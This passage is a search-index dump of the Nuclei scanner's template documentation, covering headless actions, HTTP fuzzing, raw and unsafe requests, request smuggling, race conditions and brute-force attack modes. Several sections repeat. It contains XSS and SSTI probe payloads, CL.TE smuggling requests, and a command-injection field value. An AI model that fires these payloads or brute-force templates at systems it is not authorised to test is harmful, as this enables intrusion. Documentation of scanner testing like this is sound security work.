: Content-Security-Policy","title":"deleteheader"},{"location":"templating-guide/protocols/headless/#setbody","text":"SetBody sets the body for a request / response. action : setbody args : part : response # can be request too body : '{\"success\":\"ok\"}'","title":"setbody"},{"location":"templating-guide/protocols/headless/#waitevent","text":"WaitEvent waits for an event to trigger on the page. action : waitevent args : event : 'Page.loadEventFired' The list of events supported are listed here .","title":"waitevent"},{"location":"templating-guide/protocols/headless/#keyboard","text":"Keyboard simulates a single key-press on the keyboard. action : keyboard args : keys : '\\r' # this simulates pressing enter key on keyboard keys argument accepts key-codes.","title":"keyboard"},{"location":"templating-guide/protocols/headless/#debug","text":"Debug adds a delay of 5 seconds between each headless action and also shows a trace of all the headless events occurring in the browser. Note: Only use this for debugging purposes, don't use this in production templates. action : debug","title":"debug"},{"location":"templating-guide/protocols/headless/#sleep","text":"Sleep makes the browser wait for a specified duration in seconds. This is also useful for debugging purposes. action : sleep args : duration : 5","title":"sleep"},{"location":"templating-guide/protocols/headless/#selectors","text":"Selectors are how nuclei headless engine identifies what element to execute an action on. Nuclei supports getting selectors by including a variety of options - Selector Description r / regex Element matches CSS Selector and Text Matches Regex x / xpath Element matches XPath selector js Return elements from a JS function search Search for a query (can be text, XPATH, CSS) selector (default) Element matches CSS Selector","title":"Selectors"},{"location":"templating-guide/protocols/headless/#matchers-extractor-parts","text":"Valid part values supported by Headless protocol for Matchers / Extractor are - Value Description request Headless Request <out_names> Action names with stored values raw / body / data Final DOM response from browser","title":"Matchers / Extractor Parts"},{"location":"templating-guide/protocols/headless/#example-headless-template","text":"An example headless template to automatically login into DVWA is provided below - id : dvwa-headless-automatic-login info : name : DVWA Headless Automatic Login author : pdteam severity : high headless : - steps : - args : url : \"{{BaseURL}}/login.php\" action : navigate - action : waitload - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input action : click - action : waitload - args : by : xpath value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input[2] action : click - action : waitload - args : by : xpath value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload matchers : - part : resp type : word words : - \"You have logged in as\" More complete examples are provided here","title":"Example Headless Template"},{"location":"templating-guide/protocols/http-fuzzing/","text":"HTTP Fuzzing \u00b6 Nuclei supports fuzzing of HTTP requests based on rules defined in the fuzzing section of the HTTP request. This allows creating templates for generic Web Application vulnerabilities like SQLi, SSRF, CMDi, etc without any information of the target like a classic web fuzzer. Part \u00b6 Part specifies what part of the request should be fuzzed based on the specified rules. Available options for this parameter are - query ( default ) - fuzz query parameters for URL fuzzing : - part : query # fuzz parameters in URL query Support will be added for path , header , body , cookie , etc parts soon. Type \u00b6 Type specifies the type of replacement to perform for the fuzzing rule value. Available options for this parameter are - replace ( default ) - replace the value with payload prefix - prefix the value with payload postfix - postfix the value with payload infix - infix the value with payload (place in between) fuzzing : - part : query type : postfix # Fuzz query and postfix payload to params Mode \u00b6 Mode specifies the mode in which to perform the replacements. Available modes are - multiple ( default ) - replace all values at once single - replace one value at a time fuzzing : - part : query type : postfix mode : multiple # Fuzz query postfixing payloads to all parameters at once Note : default values are set/used when other options are not defined. Filters \u00b6 Multiple filters are supported to restrict the scope of fuzzing to only interesting parameter keys and values. Nuclei HTTP Fuzzing engine converts request parts into Keys and Values which then can be filtered by their related options. The following filter fields are supported - keys - list of parameter names to fuzz (exact match) keys-regex - list of parameter regex to fuzz values - list of value regex to fuzz These filters can be used in combination to run highly targeted fuzzing based on the parameter input. A few examples of such filtering are provided below. # fuzzing command injection based on parameter name value fuzzing : - part : query type : replace mode : single keys : - \"daemon\" - \"upload\" - \"dir\" - \"execute\" - \"download\" - \"log\" - \"ip\" - \"cli\" - \"cmd\" # fuzzing openredirects based on parameter name regex fuzzing : - part : query type : replace mode : single keys-regex : - \"redirect.*\" # fuzzing ssrf based on parameter value regex fuzzing : - part : query type : replace mode : single values : - \"https?://.*\" Fuzz \u00b6 Fuzz specifies the values to replace with a type for a parameter. It supports payloads, DSL functions, etc and allows users to fully utilize the existing nuclei feature-set for fuzzing purposes. # fuzz section for xss fuzzing with stop-at-first-match payloads : reflection : - \"6842'\\\"><9967\" stop-at-first-match : true fuzzing : - part : query type : postfix mode : single fuzz : - \"{{reflection}}\" # using interactsh-url placeholder for oob testing payloads : redirect : - \"{{interactsh-url}}\" fuzzing : - part : query type : replace mode : single keys : - \"dest\" - \"redirect\" - \"uri\" fuzz : - \"https://{{redirect}}\" # using template-level variables for SSTI testing variables : first : \"{{rand_int(10000, 99999)}}\" second : \"{{rand_int(10000, 99999)}}\" result : \"{{to_number(first)*to_number(second)}}\" http : ... payloads : reflection : - '{{concat(\"{{\", \"\u00a7first\u00a7*\u00a7second\u00a7\", \"}}\")}}' fuzzing : - part : query type : postfix mode : multiple fuzz : - \"{{reflection}}\" Example Fuzzing template \u00b6 An example sample template for fuzzing XSS vulnerabilities is provided below. id : fuzz-reflection-xss info : name : Basic Reflection Potential XSS Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : reflection : - \"6842'\\\"><9967\" stop-at-first-match : true fuzzing : - part : query type : postfix mode : single fuzz : - \"{{reflection}}\" matchers-condition : and matchers : - type : word part : body words : - \"{{reflection}}\" - type : word part : header words : - \"text/html\" More complete examples are provided here","title":"HTTP Fuzzing"},{"location":"templating-guide/protocols/http-fuzzing/#http-fuzzing","text":"Nuclei supports fuzzing of HTTP requests based on rules defined in the fuzzing section of the HTTP request. This allows creating templates for generic Web Application vulnerabilities like SQLi, SSRF, CMDi, etc without any information of the target like a classic web fuzzer.","title":"HTTP Fuzzing"},{"location":"templating-guide/protocols/http-fuzzing/#part","text":"Part specifies what part of the request should be fuzzed based on the specified rules. Available options for this parameter are - query ( default ) - fuzz query parameters for URL fuzzing : - part : query # fuzz parameters in URL query Support will be added for path , header , body , cookie , etc parts soon.","title":"Part"},{"location":"templating-guide/protocols/http-fuzzing/#type","text":"Type specifies the type of replacement to perform for the fuzzing rule value. Available options for this parameter are - replace ( default ) - replace the value with payload prefix - prefix the value with payload postfix - postfix the value with payload infix - infix the value with payload (place in between) fuzzing : - part : query type : postfix # Fuzz query and postfix payload to params","title":"Type"},{"location":"templating-guide/protocols/http-fuzzing/#mode","text":"Mode specifies the mode in which to perform the replacements. Available modes are - multiple ( default ) - replace all values at once single - replace one value at a time fuzzing : - part : query type : postfix mode : multiple # Fuzz query postfixing payloads to all parameters at once Note : default values are set/used when other options are not defined.","title":"Mode"},{"location":"templating-guide/protocols/http-fuzzing/#filters","text":"Multiple filters are supported to restrict the scope of fuzzing to only interesting parameter keys and values. Nuclei HTTP Fuzzing engine converts request parts into Keys and Values which then can be filtered by their related options. The following filter fields are supported - keys - list of parameter names to fuzz (exact match) keys-regex - list of parameter regex to fuzz values - list of value regex to fuzz These filters can be used in combination to run highly targeted fuzzing based on the parameter input. A few examples of such filtering are provided below. # fuzzing command injection based on parameter name value fuzzing : - part : query type : replace mode : single keys : - \"daemon\" - \"upload\" - \"dir\" - \"execute\" - \"download\" - \"log\" - \"ip\" - \"cli\" - \"cmd\" # fuzzing openredirects based on parameter name regex fuzzing : - part : query type : replace mode : single keys-regex : - \"redirect.*\" # fuzzing ssrf based on parameter value regex fuzzing : - part : query type : replace mode : single values : - \"https?://.*\"","title":"Filters"},{"location":"templating-guide/protocols/http-fuzzing/#fuzz","text":"Fuzz specifies the values to replace with a type for a parameter. It supports payloads, DSL functions, etc and allows users to fully utilize the existing nuclei feature-set for fuzzing purposes. # fuzz section for xss fuzzing with stop-at-first-match payloads : reflection : - \"6842'\\\"><9967\" stop-at-first-match : true fuzzing : - part : query type : postfix mode : single fuzz : - \"{{reflection}}\" # using interactsh-url placeholder for oob testing payloads : redirect : - \"{{interactsh-url}}\" fuzzing : - part : query type : replace mode : single keys : - \"dest\" - \"redirect\" - \"uri\" fuzz : - \"https://{{redirect}}\" # using template-level variables for SSTI testing variables : first : \"{{rand_int(10000, 99999)}}\" second : \"{{rand_int(10000, 99999)}}\" result : \"{{to_number(first)*to_number(second)}}\" http : ... payloads : reflection : - '{{concat(\"{{\", \"\u00a7first\u00a7*\u00a7second\u00a7\", \"}}\")}}' fuzzing : - part : query type : postfix mode : multiple fuzz : - \"{{reflection}}\"","title":"Fuzz"},{"location":"templating-guide/protocols/http-fuzzing/#example-fuzzing-template","text":"An example sample template for fuzzing XSS vulnerabilities is provided below. id : fuzz-reflection-xss info : name : Basic Reflection Potential XSS Detection author : pdteam severity : low http : - method : GET path : - \"{{BaseURL}}\" payloads : reflection : - \"6842'\\\"><9967\" stop-at-first-match : true fuzzing : - part : query type : postfix mode : single fuzz : - \"{{reflection}}\" matchers-condition : and matchers : - type : word part : body words : - \"{{reflection}}\" - type : word part : header words : - \"text/html\" More complete examples are provided here","title":"Example Fuzzing template"},{"location":"templating-guide/protocols/http/","text":"Requests Nuclei offers extensive support for various features related to HTTP protocol. Raw and Model based HTTP requests are supported, along with options Non-RFC client requests support too. Payloads can also be specified and raw requests can be transformed based on payload values along with many more capabilities that are shown later on this Page. HTTP Requests start with a request block which specifies the start of the requests for the template. # Start the requests for the template right here http : Method Request method can be GET , POST , PUT , DELETE , etc. depending on the needs. # Method is the method for the request method : GET Redirects Redirection conditions can be specified per each template. By default, redirects are not followed. However, if desired, they can be enabled with redirects: true in request details. 10 redirects are followed at maximum by default which should be good enough for most use cases. More fine grained control can be exercised over number of redirects followed by using max-redirects field. An example of the usage: http : - method : GET path : - \"{{BaseURL}}/login.php\" redirects : true max-redirects : 3 Warning Currently redirects are defined per template, not per request. Path The next part of the requests is the path of the request path. Dynamic variables can be placed in the path to modify its behavior on runtime. Variables start with {{ and end with }} and are case-sensitive. {{BaseURL}} - This will replace on runtime in the request by the input URL as specified in the target file. {{RootURL}} - This will replace on runtime in the request by the root URL as specified in the target file. {{Hostname}} - Hostname variable is replaced by the hostname including port of the target on runtime. {{Host}} - This will replace on runtime in the request by the input host as specified in the target file. {{Port}} - This will replace on runtime in the request by the input port as specified in the target file. {{Path}} - This will replace on runtime in the request by the input path as specified in the target file. {{File}} - This will replace on runtime in the request by the input filename as specified in the target file. {{Scheme}} - This will replace on runtime in the request by protocol scheme as specified in the target file. An example is provided below - https://example.com:443/foo/bar.php Variable Value {{BaseURL}} https://example.com:443/foo/bar.php {{RootURL}} https://example.com:443 {{Hostname}} example.com:443 {{Host}} example.com {{Port}} 443 {{Path}} /foo {{File}} bar.php {{Scheme}} https Some sample dynamic variable replacement examples: path : \"{{BaseURL}}/.git/config\" # This path will be replaced on execution with BaseURL # If BaseURL is set to https://abc.com then the # path will get replaced to the following: https://abc.com/.git/config Multiple paths can also be specified in one request which will be requested for the target. Headers \u00b6 Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contain the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com Body \u00b6 Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\" Session \u00b6 To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true Request Condition \u00b6 Request condition allows checking for the condition between multiple requests for writing complex checks and exploits involving various HTTP requests to complete the exploit chain. The functionality will be automatically enabled if DSL matchers/extractors contain numbers as a suffix with respective attributes. For example, the attribute status_code will point to the effective status code of the current request/response pair in elaboration. Previous responses status codes are accessible by suffixing the attribute name with _n , where n is the n-th ordered request 1-based. So if the template has four requests and we are currently at number 3: - status_code : will refer to the response code of request number 3 - status_code_1 and status_code_2 will refer to the response codes of the sequential responses number one and two For example with status_code_1 , status_code_3 , and body_2 : matchers : - type : dsl dsl : - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\" Note: request conditions might require more memory as all attributes of previous responses are kept in memory Example HTTP Template \u00b6 The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. http : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\" RAW HTTP requests \u00b6 Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. http : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded a=test&b=pd Requests can be fine-tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. RAW request format also supports various helper functions letting us do run time manipulation with input. An example of the using a helper function in the header. - raw : - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. To make a request to the URL specified as input without any additional tampering, a blank Request URI can be used as specified below which will make the request to user specified input. - raw : - | GET HTTP/1.1 Host: {{Hostname}} HTTP Payloads \u00b6 Info Nuclei engine supports payloads module that allow to run various type of payloads in multiple format, It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform batteringram , pitchfork and clusterbomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request in between \u00a7 \u00a7 or {{ }} marker. An example of the using payloads with local wordlist: # HTTP Intruder fuzzing using local wordlist. payloads : paths : params.txt header : local.txt An example of the using payloads with in template wordlist support: # HTTP Intruder fuzzing using in template wordlist. payloads : password : - admin - guest - password Note: be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more than one variable to use in the template. Attack mode \u00b6 Nuclei engine supports multiple attack types, including batteringram as default type which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder. Type batteringram pitchfork clusterbomb Support batteringram The battering ram attack type places the same payload value in all positions. It uses only one payload set. It loops through the payload set and replaces all positions with the payload value. pitchfork The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. clusterbomb The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations. More details here . An example of the using clusterbomb attack to fuzz. http : - raw : - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}} payloads : path : helpers/wordlists/prams.txt header : helpers/wordlists/header.txt attack : clusterbomb # Defining HTTP fuzz attack type Unsafe HTTP Requests \u00b6 Nuclei supports rawhttp for complete request control and customization allowing any kind of malformed requests for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more. rawhttp library is disabled by default and can be enabled by including unsafe: true in the request block. Here is an example of HTTP request smuggling detection template using rawhttp . http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # Enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Advance Requests \u00b6 We\u2019ve enriched nuclei to allow advanced scanning of web servers. Users can now use multiple options to tune HTTP request workflows. Pipelining \u00b6 HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine. If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, httpx has a flag -pipeline to do so. An example configuring showing pipelining attributes of nuclei. unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info http : - raw : - |+ GET /{{path}} HTTP/1.1 Host: {{Hostname}} Referer: {{BaseURL}} attack : batteringram payloads : path : path_wordlist.txt unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 matchers : - type : status part : header status : - 200 Connection pooling \u00b6 While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info http : - raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} attack : batteringram payloads : password : password.txt threads : 40 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body Smuggling \u00b6 HTTP Smuggling is a class of Web-Attacks recently made popular by Portswigger\u2019s Research into the topic. For an in-depth overview, please visit the article linked above. In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the rawhttp engine. The most basic example of an HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the unsafe: true attribute for rawhttp based requests. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' More examples are available in template-examples section for smuggling templates. Race conditions \u00b6 Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event. We have implemented Gate mechanism in nuclei engine and allow them run via templates which makes the testing for this specific bug class simple and portable. To enable race condition check within template, race attribute can be set to true and race_count defines the number of simultaneous request you want to initiate. Below is an example template where the same request is repeated for 10 times using the gate logic. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 You can simply replace the POST request with any suspected vulnerable request and change the race_count as per your need, and it's ready to run. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads. threads : 5 race : true threads is a total number of request you wanted make with the template to perform race condition testing. Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true Requests Annotation \u00b6 Request inline annotations allow performing per request properties/behavior override. They are very similar to python/java class annotations and must be put on the request just before the RFC line. Currently, only the following overrides are supported: @Host: which overrides the real target of the request (usually the host/ip provided as input). It supports syntax with ip/domain, port, and scheme, for example: domain.tld , domain.tld:port , http://domain.tld:port @tls-sni: which overrides the SNI Name of the TLS request (usually the hostname provided as input). It supports any literals. The special value request.host uses the Host header and interactsh-url uses an interactsh generated URL. @timeout: which overrides the timeout for the request to a custom duration. It supports durations formatted as string. If no duration is specified, the default Timeout flag value is used. The following example shows the annotations within a request: - | @Host: https://projectdiscovery.io:443 POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 This is particularly useful, for example, in the case of templates with multiple requests, where one request after the initial one needs to be performed to a specific host (for example, to check an API validity): http : - raw : # this request will be sent to {{Hostname}} to get the token - | GET /getkey HTTP/1.1 Host: {{Hostname}} # This request will be sent instead to https://api.target.com:443 to verify the token validity - | @Host: https://api.target.com:443 GET /api/key={{token}} HTTP/1.1 Host: api.target.com:443 extractors : - type : regex name : token part : body regex : # random extractor of strings between prefix and suffix - 'prefix(.*)suffix' matchers : - type : word part : body words : - valid token Example of a custom timeout annotations - - | @timeout: 25s POST /conf_mail.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M Example of sni annotation with interactsh-url - - | @tls-sni: interactsh-url POST /conf_mail.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M","title":"Base HTTP"},{"location":"templating-guide/protocols/http/#headers","text":"Headers can also be specified to be sent along with the requests. Headers are placed in form of key/value pairs. An example header configuration looks like this: # headers contain the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com","title":"Headers"},{"location":"templating-guide/protocols/http/#body","text":"Body specifies a body to be sent along with the request. For instance: # Body is a string sent along with the request body : \"{\\\"some random JSON\\\"}\" # Body is a string sent along with the request body : \"admin=test\"","title":"Body"},{"location":"templating-guide/protocols/http/#session","text":"To maintain cookie based browser like session between multiple requests, you can simply use cookie-reuse: true in your template, Useful in cases where you want to maintain session between series of request to complete the exploit chain and to perform authenticated scans. # cookie-reuse accepts boolean input and false as default cookie-reuse : true","title":"Session"},{"location":"templating-guide/protocols/http/#request-condition","text":"Request condition allows checking for the condition between multiple requests for writing complex checks and exploits involving various HTTP requests to complete the exploit chain. The functionality will be automatically enabled if DSL matchers/extractors contain numbers as a suffix with respective attributes. For example, the attribute status_code will point to the effective status code of the current request/response pair in elaboration. Previous responses status codes are accessible by suffixing the attribute name with _n , where n is the n-th ordered request 1-based. So if the template has four requests and we are currently at number 3: - status_code : will refer to the response code of request number 3 - status_code_1 and status_code_2 will refer to the response codes of the sequential responses number one and two For example with status_code_1 , status_code_3 , and body_2 : matchers : - type : dsl dsl : - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\" Note: request conditions might require more memory as all attributes of previous responses are kept in memory","title":"Request Condition"},{"location":"templating-guide/protocols/http/#example-http-template","text":"The final template file for the .git/config file mentioned above is as follows: id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. http : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\"","title":"Example HTTP Template"},{"location":"templating-guide/protocols/http/#raw-http-requests","text":"Another way to create request is using raw requests which comes with more flexibility and support of DSL helper functions, like the following ones (as of now it's suggested to leave the Host header as in the example with the variable {{Hostname}} ), All the Matcher, Extractor capabilities can be used with RAW requests in same the way described above. http : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded a=test&b=pd Requests can be fine-tuned to perform the exact tasks as desired. Nuclei requests are fully configurable meaning you can configure and define each and every single thing about the requests that will be sent to the target servers. RAW request format also supports various helper functions letting us do run time manipulation with input. An example of the using a helper function in the header. - raw : - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. To make a request to the URL specified as input without any additional tampering, a blank Request URI can be used as specified below which will make the request to user specified input. - raw : - | GET HTTP/1.1 Host: {{Hostname}}","title":"RAW HTTP requests"},{"location":"templating-guide/protocols/http/#http-payloads","text":"Info Nuclei engine supports payloads module that allow to run various type of payloads in multiple format, It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform batteringram , pitchfork and clusterbomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. Payloads are defined using variable name and can be referenced in the request in between \u00a7 \u00a7 or {{ }} marker. An example of the using payloads with local wordlist: # HTTP Intruder fuzzing using local wordlist. payloads : paths : params.txt header : local.txt An example of the using payloads with in template wordlist support: # HTTP Intruder fuzzing using in template wordlist. payloads : password : - admin - guest - password Note: be careful while selecting attack type, as unexpected input will break the template. For example, if you used clusterbomb or pitchfork as attack type and defined only one variable in the payload section, template will fail to compile, as clusterbomb or pitchfork expect more than one variable to use in the template.","title":"HTTP Payloads"},{"location":"templating-guide/protocols/http/#attack-mode","text":"Nuclei engine supports multiple attack types, including batteringram as default type which generally used to fuzz single parameter, clusterbomb and pitchfork for fuzzing multiple parameters which works same as classical burp intruder. Type batteringram pitchfork clusterbomb Support batteringram The battering ram attack type places the same payload value in all positions. It uses only one payload set. It loops through the payload set and replaces all positions with the payload value. pitchfork The pitchfork attack type uses one payload set for each position. It places the first payload in the first position, the second payload in the second position, and so on. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. clusterbomb The cluster bomb attack tries all different combinations of payloads. It still puts the first payload in the first position, and the second payload in the second position. But when it loops through the payload sets, it tries all combinations. It then loops through all payload sets at the same time. The first request uses the first payload from each payload set, the second request uses the second payload from each payload set, and so on. This attack type is useful for a brute-force attack. Load a list of commonly used usernames in the first payload set, and a list of commonly used passwords in the second payload set. The cluster bomb attack will then try all combinations. More details here . An example of the using clusterbomb attack to fuzz. http : - raw : - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}} payloads : path : helpers/wordlists/prams.txt header : helpers/wordlists/header.txt attack : clusterbomb # Defining HTTP fuzz attack type","title":"Attack mode"},{"location":"templating-guide/protocols/http/#unsafe-http-requests","text":"Nuclei supports rawhttp for complete request control and customization allowing any kind of malformed requests for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more. rawhttp library is disabled by default and can be enabled by including unsafe: true in the request block. Here is an example of HTTP request smuggling detection template using rawhttp . http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # Enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")'","title":"Unsafe HTTP Requests"},{"location":"templating-guide/protocols/http/#advance-requests","text":"We\u2019ve enriched nuclei to allow advanced scanning of web servers. Users can now use multiple options to tune HTTP request workflows.","title":"Advance Requests"},{"location":"templating-guide/protocols/http/#pipelining","text":"HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from http-desync-attacks-request-smuggling-reborn . Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine. If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, httpx has a flag -pipeline to do so. An example configuring showing pipelining attributes of nuclei. unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 An example template demonstrating pipelining capabilities of nuclei has been provided below- id : pipeline-testing info : name : pipeline testing author : pdteam severity : info http : - raw : - |+ GET /{{path}} HTTP/1.1 Host: {{Hostname}} Referer: {{BaseURL}} attack : batteringram payloads : path : path_wordlist.txt unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 matchers : - type : status part : header status : - 200","title":"Pipelining"},{"location":"templating-guide/protocols/http/#connection-pooling","text":"While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement. To enable connection pooling in the template, threads attribute can be defined with respective number of threads you wanted to use in the payloads sections. Connection: Close header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling. An example template using HTTP connection pooling- id : fuzzing-example info : name : Connection 